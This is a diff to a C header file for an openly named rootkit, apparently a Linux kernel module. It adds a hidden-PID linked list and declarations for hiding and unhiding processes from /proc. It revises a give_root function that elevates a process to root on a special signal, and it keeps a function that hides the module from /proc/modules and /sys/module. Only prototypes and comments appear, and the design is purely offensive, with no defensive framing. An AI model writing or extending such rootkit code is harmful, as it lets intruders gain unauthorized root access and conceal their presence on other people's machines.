@@ -54,16 +54,62 @@
     } while (0)
 
 /**
- * Elevates the current process to root
- *
- * @param i32_pid The PID that was passed to the rootkit (should be equal to SIGROOT)
- * @param i32_sig The signal that was passed (currently unused)
+ * Structure used to store the list of hidden PIDs
  */
-void give_root(const pid_t i32_pid, const int i32_sig);
+typedef struct hidden_pid_tag {
+    struct list_head list; // PID linked list
+    pid_t i32_pid;         // PID to hide
+} hidden_pid_t;
+
+extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
 
 /**
  * Hides the rootkit from /proc/modules and /sys/module/
  */
 void hide_module(void);
+
+/**
+ * Clear the list of hidden PIDs and free the memory
+ */
+void show_all_processes(void);
+
+/**
+ * Checks if the given PID is hidden.
+ * If the given PID is 0, the current process is checked.
+ *
+ * @param i32_pid The PID to check
+ * @return `true` if the given PID is hidden, `false` otherwise
+ */
+bool is_process_hidden(const pid_t i32_pid);
+
+/**
+ * Elevates the current process to root
+ *
+ * @param i32_pid The PID that was passed to the rootkit (should be equal to SIGROOT)
+ * @param i32_sig The signal that was passed (currently unused)
+ * @return 0 on success, otherwise an error code
+ */
+long give_root(const pid_t i32_pid, const int i32_sig);
+
+/**
+ * Hides the given process from /proc/ and /proc/PID/.
+ * If the given PID is 0, the current process is hidden.
+ *
+ * @param i32_pid The PID to hide
+ * @param i32_sig The signal that was passed (currently unused)
+ * @return 0 on success, otherwise an error code
+ */
+long hide_process(const pid_t i32_pid, const int i32_sig);
+
+/**
+ * Shows (unhides) the given process from /proc/ and /proc/PID/.
+ * If the given PID is 0, the current process is shown.
+ * If the given PID is not hidden, do nothing.
+ *
+ * @param i32_pid The PID to show
+ * @param i32_sig The signal that was passed (currently unused)
+ * @return 0 on success, otherwise an error code
+ */
+long show_process(const pid_t i32_pid, const int i32_sig);
 
 #endif
